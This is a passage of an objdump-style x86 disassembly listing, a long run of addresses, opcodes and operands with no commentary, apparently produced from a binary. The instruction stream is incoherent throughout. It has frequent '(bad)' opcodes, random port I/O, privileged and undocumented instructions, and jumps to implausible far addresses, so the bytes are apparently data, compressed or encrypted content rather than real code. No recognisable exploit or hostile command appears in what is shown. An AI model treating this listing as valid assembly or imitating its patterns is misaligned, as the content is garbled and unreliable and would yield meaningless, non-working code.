  4168ab:	sub    BYTE PTR [ebp+edx*2-0x34],0x4
  4168b0:	je     0x4168d5
  4168b2:	pop    ebp
  4168b3:	test   BYTE PTR ds:0xfdf319b4,0x66
  4168ba:	(bad)  
  4168bb:	or     al,0x87
  4168bd:	in     eax,dx
  4168be:	add    ebx,DWORD PTR [edi+eax*4]
  4168c1:	cmc    
  4168c2:	sti    
  4168c3:	adc    ecx,DWORD PTR [ecx-0x76dffc0b]
  4168c9:	(bad)  
  4168cb:	adc    ecx,DWORD PTR [ecx+0x5d1c03ed]
  4168d1:	xlat   BYTE PTR ds:[ebx]
  4168d2:	adc    al,0x89
  4168d4:	push   eax
  4168d5:	xor    eax,0xb2590c69
  4168da:	or     DWORD PTR [ebx-0x19060cec],ebp
  4168e0:	add    BYTE PTR ds:0x55786a22,0x4d
  4168e7:	out    0x4d,eax
  4168e9:	add    BYTE PTR [eax+0x400afcda],bh
  4168ef:	leave  
  4168f0:	sbb    eax,0xa921ed81
  4168f5:	sbb    al,0x31
  4168f7:	xchg   esp,eax
  4168f8:	and    esp,DWORD PTR [eax]
  4168fa:	jno    0x41688a
  4168fc:	daa    
  4168fd:	outs   dx,DWORD PTR ds:[esi]
  4168fe:	sub    ecx,DWORD PTR [edi+ebp*1+0x2b8c77f5]
  416905:	cmp    al,0xf3
  416907:	add    edi,esp
  416909:	mov    BYTE PTR [ebp+0x2d],dh
  41690c:	stos   DWORD PTR es:[edi],eax
  41690d:	jle    0x416905
  41690f:	pop    ebp
  416910:	dec    ebp
  416911:	mov    DWORD PTR [ebp+0x2d],ebx
  416914:	mov    ds:0x455d837e,eax
  416919:	mov    ebp,DWORD PTR [edi+0x3103eafd]
  41691f:	push   ecx
  416920:	jo     0x4169a0
  416922:	push   ecx
  416923:	or     eax,0x97b603e7
  416928:	idiv   edi
  41692a:	xchg   al,ch
  41692c:	aas    
  41692d:	out    0x78,al
  41692f:	not    DWORD PTR [edx+0x31]
  416932:	outs   dx,BYTE PTR ds:[esi]
  416933:	inc    eax
  416934:	out    0xad,al
  416936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416937:	or     DWORD PTR [edi-0x5845cebe],esi
  41693d:	xor    BYTE PTR [eax+ebx*1-0x6b],dh
  416941:	mov    edx,0x4283856
  416946:	jle    0x416911
  416948:	sbb    bh,BYTE PTR [ebp+0x1809f34]
  41694e:	add    BYTE PTR [ecx],al
  416950:	dec    edx
  416951:	out    0xd2,eax
  416953:	jno    0x416971
  416955:	add    BYTE PTR [esi-0x154860cb],ch
  41695b:	bound  ebp,QWORD PTR [eax]
  41695d:	add    BYTE PTR [eax-0x1a40760e],bh
  416963:	popa   
  416964:	into   
  416965:	jg     0x4168f7
  416967:	xor    ch,al
  416969:	std    
  41696a:	jmp    0xa9c539ef
  41696f:	xor    eax,0x32f0b98c
  416974:	or     DWORD PTR [ecx+0x60],edx
  416977:	cmp    al,0x94
  416979:	dec    esi
  41697a:	in     eax,0xb3
  41697c:	retf   0x8918
  41697f:	(bad)  
  416981:	mov    esi,0x933e9
  416986:	fs push 0xffffffe8
  416989:	push   esp
  41698a:	pusha  
  41698b:	and    ebx,DWORD PTR [edx]
  41698d:	shr    ah,0x32
  416990:	or     DWORD PTR [eax],eax
  416992:	jmp    0xae069940
  416997:	scas   eax,DWORD PTR es:[edi]
  416998:	out    0xfd,eax
  41699a:	jmp    0x29c272d1
  41699f:	sahf   
  4169a0:	and    al,BYTE PTR [eax]
  4169a2:	in     eax,0x32
  4169a4:	or     DWORD PTR [edx+0x5],esi
  4169a7:	mov    bl,0xca
  4169a9:	add    ch,ah
  4169ab:	xor    cl,BYTE PTR [ecx]
  4169ad:	sub    DWORD PTR [eax],0x74f9307e
  4169b3:	add    BYTE PTR [ecx+edx*4-0x72],ah
  4169b7:	(bad)  [esi-0x19]
  4169ba:	std    
  4169bb:	bound  esi,QWORD PTR [edx+ecx*4]
  4169be:	enter  0xdce6,0x8e
  4169c2:	and    al,0xe5
  4169c4:	xor    cl,BYTE PTR [ecx]
  4169c6:	xchg   DWORD PTR [edi+0x4d],esp
  4169c9:	or     eax,DWORD PTR [eax]
  4169cb:	jmp    0x45f095
  4169d0:	dec    esp
  4169d1:	or     eax,DWORD PTR [eax]
  4169d3:	mov    DWORD PTR [esi+0x18000408],esi
  4169d9:	data16 cmp cl,BYTE PTR [ebx+0x40186]
  4169e0:	or     BYTE PTR [eax-0x6a],ch
  4169e3:	adc    BYTE PTR [ebx+ecx*1],cl
  4169e6:	add    BYTE PTR [ecx+0x40566],cl
  4169ec:	sbb    BYTE PTR [ebp+0x5],ah
  4169ef:	mov    DWORD PTR [ecx+esi*1+0x1c],ecx
  4169f3:	mov    ecx,DWORD PTR [ecx+esi*1+0x54]
  4169f7:	mov    dl,dl
  4169f9:	or     eax,0xacc149e
  4169fe:	add    BYTE PTR [ecx],al
  416a00:	mov    dh,0xfd
  416a02:	add    eax,DWORD PTR [eax]
  416a04:	enter  0x8522,0x7c
  416a08:	cmp    al,0xfd
  416a0a:	test   BYTE PTR [esp+ebp*1+0x15],bh
  416a0e:	test   DWORD PTR [esi+0xed4],ebx
  416a14:	inc    ecx
  416a15:	cmp    DWORD PTR [eax+ebx*2],esp
  416a18:	add    BYTE PTR [ebx+0x6b860bcf],ah
  416a1e:	adc    al,BYTE PTR [eax]
  416a20:	add    BYTE PTR ds:0x88000096,ah
  416a26:	or     al,BYTE PTR [edi-0x7ea983bc]
  416a2c:	rcr    BYTE PTR [esp+esi*1+0x126c4c87],0x3d
  416a34:	mov    esp,eax
  416a36:	sbb    BYTE PTR cs:[ecx+edx*1-0x4374d6a0],al
  416a3e:	cs pusha 
  416a40:	mov    esp,esi
  416a42:	stc    
  416a43:	add    eax,DWORD PTR [eax]
  416a45:	dec    eax
  416a46:	pop    es
  416a47:	dec    esp
  416a48:	and    al,0x31
  416a4a:	and    BYTE PTR [esi-0x77],dl
  416a4d:	lahf   
  416a4e:	fadd   QWORD PTR ds:0x57fb3100
  416a54:	and    al,0xe1
  416a56:	add    BYTE PTR [ebp+0x4c],bh
  416a59:	push   ebp
  416a5a:	cld    
  416a5b:	push   ebp
  416a5c:	dec    edi
  416a5d:	add    BYTE PTR es:[esi-0x3e8abe3c],0xd
  416a65:	lods   eax,DWORD PTR ds:[esi]
  416a66:	cld    
  416a67:	or     BYTE PTR [eax],al
  416a69:	xor    DWORD PTR [ebx-0x2dadbb3],edi
  416a6f:	adc    eax,0x45d48d89
  416a74:	mov    DWORD PTR [ebp-0x34],ebx
  416a77:	inc    ecx
  416a78:	xchg   DWORD PTR [ebp-0x2c],ebx
  416a7b:	sbb    eax,0xcc7d0087
  416a80:	sbb    ecx,ebp
  416a82:	ds pop ebx
  416a84:	inc    ebp
  416a85:	and    al,0x7d
  416a87:	pop    ebx
  416a88:	jg     0x416a9e
  416a8a:	xor    eax,0xf22901f0
  416a8f:	lahf   
  416a90:	push   esi
  416a91:	dec    edi
  416a92:	lods   al,BYTE PTR ds:[esi]
  416a93:	and    DWORD PTR ds:0xbf5b6334,0xffffffe8
  416a9a:	mov    dl,0x1a
  416a9c:	repnz std 
  416a9e:	mov    edx,0xb22c25a3
  416aa3:	sub    al,0x3
  416aa5:	or     eax,0x84da5
  416aaa:	xor    DWORD PTR [ebx-0x79],ebp
  416aad:	and    al,0x2d
  416aaf:	lock add ebp,eax
  416ab2:	cmc    
  416ab3:	rcl    DWORD PTR ds:0x1f03100,cl
  416ab9:	aaa    
  416aba:	cmc    
  416abb:	rcr    DWORD PTR [ecx],cl
  416abd:	jae    0x416a92
  416abf:	jb     0x416ab3
  416ac1:	jmp    FWORD PTR [edi]
  416ac3:	or     DWORD PTR [ebp+0x56],ebp
  416ac6:	xor    BYTE PTR [ecx],cl
  416ac8:	out    0x2a,eax
  416aca:	cmc    
  416acb:	sub    al,0xf
  416acd:	add    DWORD PTR [ebp+0x3103ea50],ebp
  416ad3:	xchg   edx,eax
  416ad4:	sub    ebp,DWORD PTR [eax]
  416ad6:	and    DWORD PTR [esi],edi
  416ad8:	adc    dl,cl
  416ada:	cmp    BYTE PTR [ecx],0x62
  416add:	ret    0xe819
  416ae0:	mov    bl,0xf1
  416ae2:	add    BYTE PTR [ecx+edx*4],bl
  416ae5:	xor    ebp,DWORD PTR [eax]
  416ae7:	pop    ecx
  416ae8:	cmp    al,0x38
  416aea:	jge    0x416aeb
  416aec:	nop
  416aed:	scas   eax,DWORD PTR es:[edi]
  416aee:	fdivr  QWORD PTR [ebp+0x38f18edc]
  416af4:	enter  0x7ef6,0x1a
  416af8:	or     bh,ah
  416afa:	add    edi,DWORD PTR [eax+0x2a2bcb4d]
  416b00:	or     esp,esp
  416b02:	add    esi,DWORD PTR [ecx]
  416b04:	gs lock test ah,dl
  416b08:	pop    es
  416b09:	out    dx,al
  416b0a:	xchg   DWORD PTR [esi],esi
  416b0c:	or     bh,ah
  416b0e:	add    ecx,DWORD PTR [edx]
  416b10:	or     esp,ecx
  416b12:	add    esi,DWORD PTR [ecx]
  416b14:	lock test BYTE PTR gs:[eax+ecx*1+0x7a687ee],dh
  416b1d:	out    0x3,eax
  416b1f:	mov    eax,0xa84c0345
  416b24:	dec    ebp
  416b25:	retf   
  416b26:	push   edi
  416b27:	test   al,0x7b
  416b29:	repz pop es
  416b2b:	xor    DWORD PTR [ecx],ecx
  416b2d:	ret    0xaec4
  416b30:	dec    ebp
  416b31:	ret    
  416b32:	and    ebp,ecx
  416b34:	cmp    BYTE PTR [ebp+edi*1+0x76],dh
  416b38:	cmp    DWORD PTR [ecx+0x4dba55],ebp
  416b3e:	int    0x26
  416b40:	cmp    DWORD PTR [ecx-0x53a82e1],ecx
  416b46:	out    0x0,al
  416b48:	popa   
  416b49:	xchg   edx,eax
  416b4a:	dec    esp
  416b4b:	add    eax,0xd4c1c2d
  416b50:	in     eax,dx
  416b51:	pop    DWORD PTR [ecx-0x18]
  416b54:	mov    ebx,0xdfe5244c
  416b59:	fs aaa 
  416b5b:	jb     0x416b60
  416b5d:	aaa    
  416b5e:	mov    DWORD PTR [edi-0x510ab2f6],esp
  416b64:	and    DWORD PTR [edx-0x738d32b4],edx
  416b6a:	inc    esp
  416b6b:	lds    edx,FWORD PTR [esi-0x6e]
  416b6e:	inc    esp
  416b6f:	int    0x6e
  416b71:	cmp    DWORD PTR [edi+0x62],ecx
  416b74:	lock lock sub eax,0x89e6017e
  416b7b:	sub    eax,0xa1292d19
  416b80:	sub    eax,0xb0b0b8cc
  416b85:	jmp    0xd43cc9c2
  416b8a:	cli    
  416b8b:	jb     0x416b81
  416b8d:	mov    ds:0xc72df6e8,eax
  416b92:	jmp    0x2496a7b0
  416b97:	adc    eax,0x51ce9262
  416b9c:	stos   DWORD PTR es:[edi],eax
  416b9d:	fdiv   st(5),st
  416b9f:	ss and eax,0x1da5243d
  416ba5:	ror    DWORD PTR [ecx+0x52494ead],0xb9
  416bac:	add    BYTE PTR ds:0x881fe8d3,cl
  416bb2:	in     eax,0xfd
  416bb4:	ret    0x916a
  416bb7:	rol    DWORD PTR [eax],0x3
  416bba:	push   esp
  416bbb:	and    al,0x58
  416bbd:	ror    DWORD PTR [edx+eiz*8-0x4232a4fd],1
  416bc4:	clc    
  416bc5:	dec    edx
  416bc6:	or     al,0x44
  416bc8:	and    al,0x4
  416bca:	xor    al,ch
  416bcc:	jge    0x416c0e
  416bce:	retf   0x2444
  416bd1:	inc    esp
  416bd2:	or     al,0x0
  416bd4:	add    BYTE PTR [eax-0x70],cl
  416bd7:	sti    
  416bd8:	jbe    0x416c0a
  416bda:	ss ins BYTE PTR es:[edi],dx
  416bdc:	and    al,0x54
  416bde:	pop    ecx
  416bdf:	xor    BYTE PTR [ebx+0x5528314c],cl
  416be5:	cmp    DWORD PTR [esi-0x32],ebx
  416be8:	call   0x3d477b
  416bed:	add    DWORD PTR [ecx+0x24],0x44
  416bf1:	xchg   ebx,eax
  416bf2:	aad    0x87
  416bf4:	inc    esp
  416bf5:	hlt    
  416bf6:	inc    esi
  416bf7:	push   edx
  416bf8:	push   eax
  416bf9:	and    DWORD PTR [ebx-0xd995418],0xfffffffb
  416c00:	cmp    ebx,DWORD PTR [ebx+0x40245c5e]
  416c06:	pop    eax
  416c07:	or     bh,al
  416c09:	test   BYTE PTR [edx],ch
  416c0b:	adc    al,0x1
  416c0d:	fadd   DWORD PTR [esi]
  416c0f:	add    BYTE PTR [ebp+0x49605f00],al
  416c15:	cmp    DWORD PTR [edx+ebp*1+0x44],edi
  416c19:	jge    0x416ba2
  416c1b:	pop    edi
  416c1c:	mov    ss,WORD PTR [esp+edx*4]
  416c1f:	push   es
  416c20:	add    BYTE PTR [edx-0x67],ch
  416c23:	aaa    
  416c24:	dec    ebp
  416c25:	mov    edi,DWORD PTR [esi]
  416c27:	lds    ebx,FWORD PTR [ebx-0x780db00d]
  416c2d:	push   esp
  416c2e:	je     0x416c7a
  416c30:	xchg   eax,ebx
  416c32:	xor    DWORD PTR [edi+0x48],esp
  416c35:	and    al,0xf1
  416c37:	popf   
  416c38:	push   ecx
  416c39:	mov    DWORD PTR [edi-0x8],esp
  416c3c:	pop    esi
  416c3d:	imul   BYTE PTR [esi-0x1d]
  416c40:	jp     0x416c8e
  416c42:	or     eax,0xaa4f58c8
  416c47:	add    bh,BYTE PTR [edi+0x5c]
  416c4a:	cmp    ecx,esi
  416c4c:	fstp   DWORD PTR [edi+eax*2-0x3d]
  416c50:	out    dx,al
  416c51:	cmp    DWORD PTR [ecx+0x67],ebp
  416c54:	dec    ebp
  416c55:	and    al,0xd9
  416c57:	push   ecx
  416c58:	cli    
  416c59:	(bad)  
  416c5a:	in     eax,dx
  416c5b:	adc    ebx,DWORD PTR [eax]
  416c5d:	add    BYTE PTR [ecx],dh
  416c5f:	lock add ecx,ebp
  416c62:	cmp    ch,BYTE PTR [edi+0x6d]
  416c65:	and    al,0x45
  416c67:	lock inc BYTE PTR [edx+0x1eee7]
  416c6e:	mov    dl,0x84
  416c70:	dec    DWORD PTR [edi+esi*4]
  416c73:	inc    esi
  416c74:	add    al,0x0
  416c76:	add    BYTE PTR [ecx],dh
  416c78:	addr16 push ebp
  416c7a:	and    al,0x51
  416c7c:	push   edi
  416c7d:	adc    DWORD PTR [esi*1-0xc7efe10],0x59
  416c85:	dec    edi
  416c86:	xor    edx,0xf18152ed
  416c8c:	in     eax,dx
  416c8d:	push   ecx
  416c8e:	mov    edi,DWORD PTR [ebp+0xc]
  416c91:	xor    BYTE PTR [edi-0x46],cl
  416c94:	sub    ecx,ebx
  416c96:	nop
  416c97:	mov    eax,0x6d89ee52
  416c9c:	adc    al,0x34
  416c9e:	cmp    ebp,esi
  416ca0:	or     ebx,DWORD PTR [ecx+ecx*4]
  416ca3:	std    
  416ca4:	adc    edi,DWORD PTR [eax]
  416ca6:	push   edx
  416ca7:	stos   BYTE PTR es:[edi],al
  416ca8:	add    DWORD PTR [ecx+0x7c],edx
  416cab:	push   edx
  416cac:	or     DWORD PTR [edi],ecx
  416cae:	lock and cl,0x1e
  416cb2:	jp     0x416d1d
  416cb4:	lea    ebp,[ebx-0x48c3b6d9]
  416cba:	jp     0x416d23
  416cbc:	lock adc eax,0xd2e16cf8
  416cc2:	ret    0x85be
  416cc5:	or     DWORD PTR [edx],eax
  416cc7:	xor    bh,al
  416cc9:	bound  edi,QWORD PTR [ebx-0x2716206a]
  416ccf:	sbb    esi,ecx
  416cd1:	shl    edi,0x44
  416cd4:	loope  0x416d38
  416cd6:	int3   
  416cd7:	test   al,0x4c
  416cd9:	add    ebx,DWORD PTR [eax+eax*1]
  416cdc:	loop   0x416d16
  416cde:	jb     0x416c9e
  416ce0:	sbb    ebp,edx
  416ce2:	mov    ah,0xed
  416ce4:	and    al,0x95
  416ce6:	lahf   
  416ce7:	sbb    eax,ebp
  416ce9:	or     al,0xa0
  416ceb:	lods   al,BYTE PTR ds:[esi]
  416cec:	push   cs
  416ced:	lods   al,BYTE PTR ds:[esi]
  416cee:	jb     0x416d0e
  416cf0:	add    al,0xf3
  416cf2:	mov    eax,0xa8d3b8ea
  416cf7:	fistp  DWORD PTR [esp+ecx*1]
  416cfa:	mov    eax,ds:0xbb256d79
  416cff:	add    cl,bh
  416d01:	and    al,0x90
  416d03:	outs   dx,DWORD PTR ds:[esi]
  416d04:	cmp    eax,ecx
  416d06:	sub    ebp,DWORD PTR [eax]
  416d08:	inc    ebp
  416d09:	or     ah,bh
  416d0b:	add    esi,DWORD PTR [ecx]
  416d0d:	xchg   BYTE PTR [esi+0x76],ah
  416d10:	sbb    DWORD PTR [esp],esp
  416d13:	jo     0x416d22
  416d15:	xchg   esp,eax
  416d16:	mov    ebx,0xb9390127
  416d1b:	js     0x416d04
  416d1d:	icebp  
  416d1e:	jne    0x416d17
  416d20:	lods   al,BYTE PTR ds:[esi]
  416d21:	loopne 0x416d95
  416d23:	int3   
  416d24:	mov    eax,0x3d0d0045
  416d29:	cmp    al,0x50
  416d2b:	(bad)  
  416d2c:	xlat   BYTE PTR ds:[ebx]
  416d2d:	icebp  
  416d2e:	jge    0x416d4c
  416d30:	pushf  
  416d31:	fidivr WORD PTR [ecx]
  416d33:	inc    ecx
  416d34:	test   BYTE PTR [edx+eax*1-0x7ef6cd16],dl
  416d3b:	lea    ecx,[esi-0xb]
  416d3e:	push   ebp
  416d40:	add    BYTE PTR [edi+0x32e902d6],dh
  416d46:	mov    bh,bl
  416d48:	jmp    0x932:0xe9d48e5d
  416d4f:	mov    DWORD PTR ds:0x35892919,esi
  416d55:	sbb    DWORD PTR [ecx-0x77],eax
  416d58:	outs   dx,DWORD PTR ds:[esi]
  416d59:	es add eax,0xa0b1e900
  416d5f:	sti    
  416d60:	sbb    BYTE PTR [eax-0x4fe4fe36],dh
  416d66:	enter  0x1901,0x9e
  416d6a:	dec    ebp
  416d6b:	and    al,0xed
  416d6d:	adc    DWORD PTR [edx-0x1f246e32],0xfffffffd
  416d74:	sahf   
  416d75:	mov    DWORD PTR [ebp+0x24],eax
  416d78:	fnstcw WORD PTR [ecx+0x35]
  416d7b:	and    al,0xd5
  416d7d:	jns    0x416dbc
  416d7f:	and    al,0xd1
  416d81:	sbb    edx,ecx
  416d83:	push   edx
  416d84:	jb     0x416d2a
  416d86:	cmp    BYTE PTR [esp+ecx*8-0x6],bh
  416d8a:	and    al,0xf3
  416d8c:	outs   dx,BYTE PTR ds:[esi]
  416d8d:	lds    edi,FWORD PTR [ebx]
  416d8f:	push   ecx
  416d90:	jb     0x416d1e
  416d92:	xchg   DWORD PTR [ebp+eax*1+0x11],eax
  416d96:	icebp  
  416d97:	adc    eax,0x89ddcd5c
  416d9c:	popf   
  416d9d:	push   cs
  416d9e:	and    eax,0x93590029
  416da3:	jg     0x416d87
  416da5:	add    BYTE PTR [ebx+0x508bc208],bl
  416dab:	retf   
  416dac:	cmc    
  416dad:	add    dh,bl
  416daf:	jmp    edi
  416db1:	jmp    FWORD PTR [ebp*8+0x60cb55fb]
  416db8:	into   
  416db9:	mov    esp,ecx
  416dbb:	daa    
  416dbc:	sub    al,0xe8
  416dbe:	sbb    bl,al
  416dc0:	sti    
  416dc1:	jmp    ebx
  416dc3:	mov    ds:0x276c4487,eax
  416dc8:	daa    
  416dc9:	enter  0xa24b,0xb8
  416dcd:	jmp    0xf76fcebc
  416dd2:	popa   
  416dd3:	mov    ch,0xfa
  416dd5:	mov    eax,DWORD PTR [edx+0x4b1fe5c5]
  416ddb:	popf   
  416ddc:	xchg   DWORD PTR [esp+ebp*1+0x19],eax
  416de0:	inc    edi
  416de2:	xor    edi,DWORD PTR [ecx+edi*2+0x2449cf08]
  416de9:	adc    al,0x9
  416deb:	or     eax,DWORD PTR [eax]
  416ded:	add    BYTE PTR [ebp+0x132876f2],cl
  416df3:	retf   0x247c
  416df6:	cmp    DWORD PTR [ecx],0x24
  416df9:	xor    BYTE PTR [eax],bh
  416dfb:	aaa    
  416dfc:	xchg   esi,ecx
  416dfe:	mov    al,0x94
  416e00:	hlt    
  416e01:	push   DWORD PTR [edi+0xc8bd85e]
  416e07:	sub    DWORD PTR [eax],ebp
  416e09:	push   ebp
  416e0a:	add    BYTE PTR [eax],bh
  416e0c:	pop    esi
  416e0d:	into   
  416e0e:	call   0x3d477d
  416e13:	adc    ecx,ebp
  416e15:	or     ecx,DWORD PTR [ebp+ebp*1+0x31000007]
  416e1c:	jae    0x416e86
  416e1e:	and    al,0x1d
  416e20:	lock cli 
  416e22:	or     BYTE PTR [ebx-0xe],0x1
  416e26:	add    BYTE PTR [edx-0x4ba7e284],bh
  416e2c:	pop    ss
  416e2d:	stc    
  416e2e:	or     DWORD PTR [edx],0xfffffff1
  416e31:	add    DWORD PTR [eax],eax
  416e33:	mov    dl,0x27
  416e35:	add    ecx,DWORD PTR ds:0x4a0af
  416e3b:	xor    DWORD PTR [ebx+0x50],ebp
  416e3e:	and    al,0xdd
  416e40:	push   0xffffffb9
  416e42:	sub    DWORD PTR [edx+0x55],edi
  416e45:	add    BYTE PTR [edx],cl
  416e47:	sub    ah,BYTE PTR [edi]
  416e49:	jb     0x416e4d
  416e4b:	stos   BYTE PTR es:[edi],al
  416e4c:	das    
  416e4d:	push   esp
  416e4e:	mov    ebp,ebp
  416e50:	ret    
  416e51:	or     eax,0x54236e29
  416e56:	mov    esi,ebp
  416e58:	add    ebp,DWORD PTR [eax]
  416e5a:	dec    edi
  416e5b:	stos   BYTE PTR es:[edi],al
  416e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e5d:	jl     0x416ebb
  416e5f:	or     eax,0x26ccdc04
  416e64:	(bad)  
  416e65:	jmp    0x6572:0x3004a537
  416e6c:	imul   ecx,DWORD PTR [ebp+0x24],0x0
  416e70:	popa   
  416e71:	not    DWORD PTR [ebp-0x77]
  416e74:	push   DWORD PTR [edi+0x28]
  416e77:	hlt    
  416e78:	push   es
  416e79:	jg     0x416ef9
  416e7b:	fsubr  DWORD PTR [edx+0x5e38202b]
  416e81:	and    BYTE PTR [ebp-0x32],bh
  416e84:	fnstenv [ebp-0x35190213]
  416e8a:	(bad)  
  416e8b:	mov    DWORD PTR [ebp-0x34],edi
  416e8e:	or     eax,0x356b417e
  416e93:	and    al,0x1
  416e95:	or     DWORD PTR [edx+0x4f],esi
  416e98:	or     eax,0x15377015
  416e9d:	and    DWORD PTR [eax+0x4f],esp
  416ea0:	or     eax,0x553f621d
  416ea5:	stc    
  416ea6:	popf   
  416ea7:	push   esi
  416ea8:	add    DWORD PTR [edx-0x27ab24d3],edx
  416eae:	ss jmp 0x37e4:0x2c034ca8
  416eb6:	jb     0x416e71
  416eb8:	mov    eax,0x80ec0fc0
  416ebd:	fst    QWORD PTR [esi]
  416ebf:	cs jo  0x416ecf
  416ec2:	pop    esp
  416ec3:	mov    ds:0x7ee70931,al
  416ec8:	add    eax,0xbf2ecf25
  416ecd:	and    al,0xeb
  416ecf:	add    esi,DWORD PTR [ecx]
  416ed1:	push   esp
  416ed2:	(bad)  
  416ed3:	jle    0x416ed5
  416ed5:	in     eax,0x24
  416ed7:	sti    
  416ed8:	jl     0x416ec7
  416eda:	and    al,0xf7
  416edc:	push   eax
  416edd:	jecxz  0x416f17
  416edf:	bound  edi,QWORD PTR [edx-0x162825b7]
  416ee5:	sub    al,0x37
  416ee7:	sbb    bh,BYTE PTR [ebp-0x9]
  416eea:	xchg   edx,eax
  416eeb:	and    esp,DWORD PTR [eax]
  416eed:	dec    ebp
  416eee:	icebp  
  416eef:	lods   eax,DWORD PTR ds:[esi]
  416ef0:	cmc    
  416ef1:	adc    al,0xdd
  416ef3:	bound  edi,QWORD PTR [eax]
  416ef5:	push   ebp
  416ef6:	and    eax,0xb8b8bbea
  416efb:	xor    al,0x46
  416efd:	mov    dh,0x4d
  416eff:	retf   
  416f00:	sbb    esp,DWORD PTR [ebx-0x70]
  416f03:	popf   
  416f04:	fsub   QWORD PTR [ecx-0x47167928]
  416f0a:	shl    DWORD PTR [edx+0x40],0x15
  416f0e:	and    DWORD PTR [eax],eax
  416f10:	push   ds
  416f11:	jge    0x416ea5
  416f13:	into   
  416f14:	adc    DWORD PTR [edx+0x4466fdda],0x340d246d
  416f1e:	ror    DWORD PTR [ecx+0x392516ad],0x2a
  416f25:	sub    al,0x3d
  416f27:	and    al,0xa1
  416f29:	sbb    BYTE PTR [ecx+ebp*8-0x1b],al
  416f2d:	sbb    eax,0x1591243d
  416f32:	inc    ebp
  416f33:	and    al,0xf1
  416f35:	pop    ebp
  416f36:	and    DWORD PTR [ebp*8+0x73093200],0xfffffff0
  416f3e:	mov    ch,0x9b
  416f40:	sub    ch,ch
  416f42:	xor    cl,BYTE PTR [ecx]
  416f44:	add    BYTE PTR [ebp-0x13ffdfc3],dl
  416f4a:	xor    cl,BYTE PTR [ecx]
  416f4c:	jl     0x416f32
  416f4e:	mov    ch,0xde
  416f50:	add    bh,BYTE PTR [ebp+0xc]
  416f53:	pop    esp
  416f54:	jl     0x416f1b
  416f56:	sbb    cl,BYTE PTR [ecx]
  416f58:	jnp    0x416f43
  416f5a:	xor    bl,BYTE PTR [ebp+0x3]
  416f5d:	push   0x49
  416f5f:	or     dh,BYTE PTR [edx+edi*8-0x4b]
  416f63:	dec    esp
  416f64:	and    al,0x11
  416f66:	or     BYTE PTR [ecx+ecx*4-0x49],0xa
  416f6b:	retf   
  416f6c:	icebp  
  416f6d:	mov    esi,0x6230f209
  416f72:	outs   dx,BYTE PTR ds:[esi]
  416f73:	and    eax,0x254e6258
  416f78:	adc    BYTE PTR [edx-0x23],dh
  416f7b:	xor    ebp,edx
  416f7d:	cmp    esp,DWORD PTR [ebp-0x6e]
  416f80:	into   
  416f81:	sbb    DWORD PTR [edi-0x26710228],0x8002444
  416f8b:	test   ebx,ebp
  416f8d:	add    ebp,esp
  416f8f:	jmp    0x4c94827b
  416f94:	and    al,0x10
  416f96:	ins    DWORD PTR es:[edi],dx
  416f97:	sbb    eax,0x5c8a51fb
  416f9c:	into   
  416f9d:	call   0xfc19a9a2
  416fa2:	call   FWORD PTR [ebx]
  416fa4:	bnd jg 0x416fa4
  416fa7:	fwait
  416fa8:	loopne 0x416f36
  416faa:	sbb    DWORD PTR [eax+0x168b0007],0x8800040c
  416fb4:	dec    edx
  416fb5:	dec    edi
  416fb6:	push   eax
  416fb7:	adc    esp,DWORD PTR [edx-0xed7e118]
  416fbd:	sti    
  416fbe:	mov    ecx,esp
  416fc0:	sti    
  416fc1:	daa    
  416fc2:	push   ebp
  416fc3:	mov    ecx,0x208bce5c
  416fc8:	shl    al,0xf2
  416fcb:	das    
  416fcc:	icebp  
  416fcd:	aaa    
  416fce:	ret    
  416fcf:	(bad)  
  416fd1:	xchg   BYTE PTR [esp+eiz*2-0x1],al
  416fd5:	xchg   BYTE PTR ss:[ebx+ebx*8-0x3],dh
  416fda:	jmp    ebp
  416fdc:	fld    QWORD PTR [eax+0x920be]
  416fe2:	add    BYTE PTR [eax+0x6b],cl
  416fe5:	inc    ecx
  416fe6:	cmp    eax,0xa18
  416feb:	ins    BYTE PTR es:[edi],dx
  416fec:	or     BYTE PTR [edi-0x3],bh
  416fef:	or     ch,BYTE PTR [ebx+0x3]
  416ff2:	cmp    eax,0x7208
  416ff7:	pop    esp
  416ff8:	pop    ss
  416ff9:	xchg   DWORD PTR [esp+esi*8+0x4e],ebx
  416ffd:	test   DWORD PTR [esp+esi*8+0xa],ebp
  417001:	sub    ebp,0x23fc3100
  417007:	mov    edi,eax
  417009:	aam    0xfd
  41700b:	jmp    esi
  41700d:	call   DWORD PTR [ecx-0x77]
  417010:	out    dx,eax
  417011:	js     0x417036
  417013:	lock (bad) 
  417015:	push   ebx
  417016:	lods   al,BYTE PTR ds:[esi]
  417017:	dec    esi
  417019:	lock add edi,edi
  41701c:	lods   al,BYTE PTR ds:[esi]
  41701d:	fdiv   st(5),st
  41701f:	(bad)  
  417020:	mov    esi,0x1d243ff9
  417025:	mov    ebp,0xed0d8be1
  41702a:	out    0xe9,al
  41702c:	or     edx,DWORD PTR [edi+0x48]
  41702f:	and    al,0xf9
  417031:	push   esi
  417032:	inc    eax
  417033:	and    al,0x49
  417035:	jge    0x417088
  417037:	mov    DWORD PTR [edi+0x48],edi
  41703a:	add    ecx,esi
  41703c:	xchg   BYTE PTR [ebx],ah
  41703e:	add    ebp,DWORD PTR [esi+0x1e425]
  417044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417045:	xchg   esp,eax
  417046:	or     ch,bh
  417048:	pop    edx
  417049:	int    0x7a
  41704b:	pop    esp
  41704c:	or     eax,0xe4fd80a8
  417051:	mov    cl,0x7a
  417053:	dec    esp
  417054:	or     eax,0x25967ac8
  417059:	in     al,0x1
  41705b:	add    BYTE PTR [eax-0x57c3dfcc],bh
  417061:	sub    al,0x20
  417063:	cmp    BYTE PTR [eax+0x10201c],ch
  417069:	jbe    0x417032
  41706b:	or     eax,DWORD PTR [ebx+0x45011c26]
  417071:	or     ch,bl
  417073:	jp     0x416ffb
  417075:	cmp    eax,0x620001ec
  41707a:	add    BYTE PTR [ecx-0x32],bh
  41707d:	sbb    DWORD PTR [ecx],ecx
  41707f:	pop    ebp
  417080:	(bad)  
  417081:	cld    
  417082:	fstp   DWORD PTR [esi-0x18fae283]
  417088:	add    esi,DWORD PTR [edx-0x27802127]
  41708e:	or     bh,ah
  417090:	add    ebx,DWORD PTR [eax]
  417092:	pop    ebp
  417093:	ret    
  417094:	daa    
  417095:	and    al,0x84
  417097:	mov    BYTE PTR [ebx],al
  417099:	xor    DWORD PTR [ecx],ecx
  41709b:	bound  ecx,QWORD PTR [edi+0xd]
  41709e:	xor    eax,0xce08b672
